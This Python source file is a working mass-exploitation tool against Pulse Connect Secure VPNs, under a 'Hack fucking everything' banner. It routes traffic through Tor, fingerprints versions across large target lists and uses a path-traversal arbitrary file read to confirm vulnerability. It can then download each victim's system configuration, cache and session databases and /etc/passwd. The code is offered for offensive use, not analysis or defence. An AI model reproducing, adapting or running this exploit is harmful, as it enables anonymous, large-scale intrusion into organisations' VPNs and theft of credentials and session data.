import subprocess
import json
import argparse
import requests
import ssl
from bs4 import BeautifulSoup
from colorama import Fore
import urllib3
from multiprocessing.dummy import Pool
from requests.exceptions import Timeout, ConnectionError
import tqdm
urllib3.disable_warnings()


class PulseScanner:

    def __init__(self, **kwargs):

        self.vuln_versions = [
            '8.3.6.64943', '8.2.7.54857', '8.2.4.48385', '8.2.6.51693', '8.2.5.49363', '8.2.8.58717', '8.2.7.55673',
            '8.2.8.56587', '8.3.7.65013', '8.3.5.63409', '8.2.10.61361', '8.3.5.64941', '8.3.1.55339', '9.0.3.64015',
            '8.3.4.60519', '8.3.2.58581', '8.3.1.56155', '8.3.3.59199', '8.3.2.59379', '9.0.1.63949', '8.3.5.64933',
            '8.3.2.57449', '9.0.3.64003', '8.2.1.41241', '9.0.2.63965', '8.2.8.57583', '8.2.3.46007', '8.3.4.65021',
            '9.0.3.64014', '9.0.2.63975', '8.2.5.53349', '8.2.5.50797', '8.2.1.42861', '8.3.1.51879', '8.2.3.46931',
            '8.2.9.58917', '8.3.3.58545', '8.2.11.63995', '8.2.7.54521', '9.0.5.64107', '8.3.6.64989', '9.0.3.64041',
            '8.2.8.57583', '8.2.2.44173', '9.0.3.64025', '9.0.2.63965', '8.2.12.63999', '8.2.3.46007', '9.0.3.64029',
            '9.0.3.63979', '9.0.3.64047', '9.0.1.64487', '8.3.4.61083', '8.3.1.53359', '9.0.2.63993', '8.2.4.47329',
            '8.3.1.60795'
        ]
        self.not_vuln = [
            '8.0.3.30597', '9.0.3.64053', '9.0.4.64091', '7.1.12.21827', '8.0.8.33771', '8.0.4.31069', '6.5.0.15991',
            '8.1.1.33981', '8.0.13.38659', '8.1.9.45775', '8.1.12.58855', '6.4.0.14063', '8.1.4.37683',
            '8.1.14.59737', '9.1.2.2331', '7.4.0.32125', '7.1.0.20169', '8.0.7.33657', '8.1.2.34845', '8.1.15.59747',
            '8.0.17.58013', '7.1.16.26805', '8.1.9.51529', '9.0.4.64055', '8.1.7.41041', '7.4.0.31777', '7.4.0.30599',
            '6.2.0.13255', '8.0.4.31475', '8.3.7.65025', '8.0.10.35099', '7.1.17.28099', '7.4.0.32725', '9.1.1.1505',
            '7.4.0.30667', '7.4.0.30731', '8.1.11.54323', '7.1.0.18671', '7.1.20.32187', '8.2.12.64003',
            '8.1.1.33493', '7.4.0.33857', '8.1.6.39491', '8.0.14.41869', '8.0.3.30619', '7.4.0.30611', '8.1.8.43849',
            '7.2.0.22399', '7.4.0.31481', '7.3.0.27317', '8.1.13.59735', '8.0.7.32723', '8.1.12.55809', '8.1.11.52981',
            '8.0.13.39523', '7.3.0.22751', '8.0.5.31739', '8.1.10.49689', '8.0.6.32195', '7.1.9.20893', '7.3.0.24657',
            '8.1.9.48255', '8.0.11.36363', '6.5.0.15255', '7.0.0.18809', '8.0.9.34269', '8.0.16.50405', '8.0.16.54339',
            '7.1.10.21187', '7.4.0.28485', '8.1.4.37085', '8.1.3.36361', '7.2.0.20761', '6.3.0.14121', '7.1.11.21451',
            '7.1.0.19525', '8.1.5.38093', '7.4.0.38293', '7.3.0.30333', '7.2.0.23551', '7.0.0.18107', '6.5.0.16339',
            '7.0.0.18107', '7.1.0.19757', '8.0.1.27973', '7.1.8.20737', '6.5.0.16789', '7.0.0.17289', '6.5.0.14951',
            '7.1.0.17675', '7.2.0.20645', '7.2.0.22071', '7.1.18.29707', '7.2.0.21017', '6.2.0.14529', '6.4.0.14811',
            '6.5.0.17087'
        ]
        self._v = kwargs.get('v')
        self.outputFile = kwargs.get('outputFile')
        self.targetList = kwargs.get('targetList')
        self.resumeFile = kwargs.get('resumeFile')
        self.threads = kwargs.get('threads')
        self.getUnknowns = kwargs.get('unknowns')
        self.timeout = kwargs.get("timeout")
        self.checkAnyway = kwargs.get("checkAnyway")
        self._dump = kwargs.get("dump")
        self._results = {
            "scan_results": []
        }

        self._proxies = {
            'http': 'socks5://127.0.0.1:9050',
            'https': 'socks5://127.0.0.1:9050'
        }

    def check_version(self, target):

        target = target.rstrip('\n')
        if self._v:
            print(f"{Fore.LIGHTBLACK_EX}[-] Trying {target}...{Fore.RESET}")
        try:
            req = requests.get(f'https://{target}/dana-na/nc/nc_gina_ver.txt',
                               proxies=self._proxies, verify=False, allow_redirects=False, timeout=int(self.timeout))
            html = req.content.decode('utf-8')
        except Timeout as err:
            if self._v:
                print(f"{Fore.LIGHTBLACK_EX}[!] Timed out for {target}. Skipping...{Fore.RESET}")
            return False
        except urllib3.exceptions.MaxRetryError as e:
            if self._v:
                print(f"{Fore.LIGHTBLACK_EX}[!] Max retries exceeded for {target}. Skipping...{Fore.RESET}")
            return False
        except (ConnectionError, ssl.SSLError, ValueError):
            return False
        except requests.exceptions.InvalidURL:
            if self._v:
                print(f"{Fore.LIGHTBLACK_EX}[!] Invalid URL: {target}. Skipping...{Fore.RESET}")
            return False
        except (UnicodeError, UnicodeDecodeError) as err:
            if self._v:
                print(f"{Fore.LIGHTBLACK_EX}[!] Unicode Error for: {target}. Skipping. Error:{err}{Fore.RESET}")
            return False
        except (requests.exceptions.ChunkedEncodingError, requests.exceptions.ContentDecodingError, AttributeError) as err:
            if self._v:
                print(f"{Fore.LIGHTBLACK_EX}[!] Encoding Error for: {target}. Skipping. Error:{err}{Fore.RESET}")
            return False

        if req.status_code == 200:

            if self.outputFile:
                outfile = open(f"{self.outputFile}_resume", 'a')
            else:
                outfile = None

            if self._v:
                print(f"{Fore.LIGHTCYAN_EX}[!] Got a 200 response code for {target}.{Fore.RESET}")
            try:
                soup = BeautifulSoup(html, 'html.parser')
            except UnicodeDecodeError as e:
                if self._v:
                    print(f"{Fore.LIGHTBLACK_EX}[!] Unicode Error on response object for: {target}. Skipping. Error:{e}{Fore.RESET}")
                return False
            try:
                version = soup.find("param", {"name": "ProductVersion"})['value']
            except TypeError as e:
                return False  # If there is no version, its probably not a VPN.

            if version:
                print(f"{Fore.LIGHTGREEN_EX}[+] Got a hit for {target}! Version: {version}{Fore.RESET}")

                if self.checkAnyway:
                    # Override the reliance on list based checking and attempt to conduct arbitrary file read.
                    status = self.check_vuln(target)
                    if status:
                        print(f"{Fore.LIGHTRED_EX}[$] {target} is VULNERABLE!{Fore.RESET}")
                        result = {"host": target, "version": version, "status": True}
                        if outfile:
                            outfile.write(json.dumps(result) + '\n')
                            outfile.close()
                        if self._dump:
                            self.dump(target)
                        return result
                    else:
                        print(f"{Fore.YELLOW}[-] {target} is NOT VULN!{Fore.RESET}")
                        result = {"host": target, "version": version, "status": False}
                        if outfile:
                            outfile.write(json.dumps(result) + '\n')
                            outfile.close()
                        return result
                else:
                    if version in self.vuln_versions:
                        print(f"{Fore.LIGHTRED_EX}[$] {target} is VULNERABLE!{Fore.RESET}")
                        result = {"host": target, "version": version, "status": True}
                        if outfile:
                            outfile.write(json.dumps(result) + '\n')
                            outfile.close()
                        if self._dump:
                            self.dump(target)
                        return result
                    elif version in self.not_vuln:
                        print(f"{Fore.YELLOW}[-] {target} is NOT VULN!{Fore.RESET}")
                        result = {"host": target, "version": version, "status": False}
                        if outfile:
                            outfile.write(json.dumps(result) + '\n')
                            outfile.close()
                        return result
                    else:
                        print(f"{Fore.LIGHTMAGENTA_EX}[!] {target} is an UNKNOWN VERSION!{Fore.RESET}")
                        if self.getUnknowns:
                            if self._v:
                                print(f"{Fore.LIGHTBLACK_EX}[-] Running vulncheck on: {target}...{Fore.RESET}")
                            status = self.check_vuln(target)
                            if status:
                                # If its confirmed to be vulnerable, let it be true.
                                print(f"{Fore.LIGHTRED_EX}[$] {target} is VULNERABLE!{Fore.RESET}")
                                result = {"host": target, "version": version, "status": True}
                                if outfile:
                                    outfile.write(json.dumps(result) + '\n')
                                    outfile.close()
                                if self._dump:
                                    self.dump(target)
                                return result
                            else:
                                print(f"{Fore.YELLOW}[-] {target} is NOT VULN!{Fore.RESET}")
                        # Keep the status as unknown in case the proxy is interfering with the ability to check vuln status.
                        result = {"host": target, "version": version, "status": "unknown"}
                        if outfile:
                            outfile.write(json.dumps(result) + '\n')
                            outfile.close()
                        return result
            else:
                if self._v:
                    print(f"{Fore.LIGHTBLACK_EX}[-] {target} is not an instance.{Fore.RESET}")
                return False

        else:
            if self._v:
                print(f"{Fore.LIGHTBLACK_EX}[-] {target} is not an instance.{Fore.RESET}")
            return False

    def check_vuln(self, target):
        """
        Use arbitrary file read if the version is unknown to test if it is vulnerable.
        :return: Boolean indicating status of vulnerability
        """
        url = f"https://{target}/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"
        http_code = '"%{http_code}"'
        cmd = f'curl --socks5 127.0.0.1:9050 -skIo /dev/null -w {http_code} {url} --path-as-is'
        res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).communicate()[0]
        if res.decode('utf-8') == '200':
            return True
        else:
            return False

    def run(self):

        p = Pool(processes=int(self.threads))

        if self.resumeFile:
            with open(self.resumeFile, 'r') as rf:
                resume = rf.readlines()
            last_entry = resume[-1]
            with open(self.targetList, 'r') as f:
                lines = f.readlines()
            slice_no = lines.index(json.loads(last_entry)['host'] + '\n')
            # Seek to the last discovered entry in the resume file.
            lines = lines[slice_no:]
            rf.close()
        else:
            with open(self.targetList, 'r') as f:
                lines = f.readlines()

        f.close()

        for _ in tqdm.tqdm(p.imap_unordered(self.check_version, lines), total=len(lines)):
            if _:
                self._results["scan_results"].append(_)

        if self.outputFile:
            with open(self.outputFile, "w") as wf:
                wf.write(json.dumps(self._results))
            wf.close()

        if self.getUnknowns:
            self.get_unknowns()

    def get_unknowns(self):

        for host in self._results['scan_results']:
            if host['status'] == "unknown":
                print(f"{Fore.LIGHTMAGENTA_EX}[!] {host['host']}: version: {host['version']}!{Fore.RESET}")

    def dump(self, target):
        urls = {
            "config": f"https://{target}/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/system?/dana/html5acc/guacamole/",
            "cache": f"https://{target}/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/",
            "sessions": f"https://{target}/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb?/dana/html5acc/guacamole/",
            "localusers": f"https://{target}/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"
        }
        i = 0
        for file in urls:
            i += 1
            if self._v:
                print(f"{Fore.LIGHTCYAN_EX}[-] Downloading file {i}/{len(urls)} for {target}.{Fore.RESET}")
            try:
                cmd = f"curl --socks5 127.0.0.1:9050 {urls[file]} -sk --path-as-is --output {target}_{file}"
                res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
                res.wait()
                res.communicate()
            except Exception as err:
                if self._v:
                    print(f"{Fore.LIGHTBLACK_EX}[!] Error dumping {file} for {target}. Error: {err}. Skipping...{Fore.RESET}")


def main():

    banner = f"""{Fore.RED} __             __        __  
|__) |  | |    /__`  /\  |__) 
|    \__/ |___ .__/ /~~\ |  \ 
  Hack fucking everything.{Fore.RESET}"""

    print(banner)
    parser = argparse.ArgumentParser(description="Scrapes targets for Pulse Connect Secure VPNs and enumerates their versions.")
    parser.add_argument("-iL", "--targets", dest="targetList", action='store',
                        help="An input list containing the domains to scan.")
    parser.add_argument('-v', action='store_true', default=False, help="Enable verbose logging.")
    parser.add_argument('-o', "--outfile", dest='outputFile', action='store',
                        help="JSON output file of results.")
    parser.add_argument("-t", "--threads", action='store', default=100, help="Number of threads (default: 100)")
    parser.add_argument("-u", "--unknown", dest="unknowns", action='store_true', default=False, help="Check to see if the unknown version numbers are vulnerable.")
    parser.add_argument("--timeout", action='store', default=20, help="Adjust the timeout (may affect scan accuracy).")
    parser.add_argument("--check-anyway", dest='checkAnyway', default=False, action="store_true", help="Check if vulnerable anyways.")
    parser.add_argument("-d", "--dump", dest="dump", default=False, action="store_true", help="Dump files off the vulnerable VPN.")
    parser.add_argument("-r", "--resume", dest="resume", action="store", help="Location of resume file to restart scan.")

    args = parser.parse_args()

    scanner = PulseScanner(targetList=args.targetList, v=args.v, outputFile=args.outputFile, threads=args.threads,
                           timeout=args.timeout, checkAnway=args.checkAnyway, dump=args.dump, unknowns=args.unknowns,
                           resumeFile=args.resume)
    scanner.run()


if __name__ == "__main__":

    main()
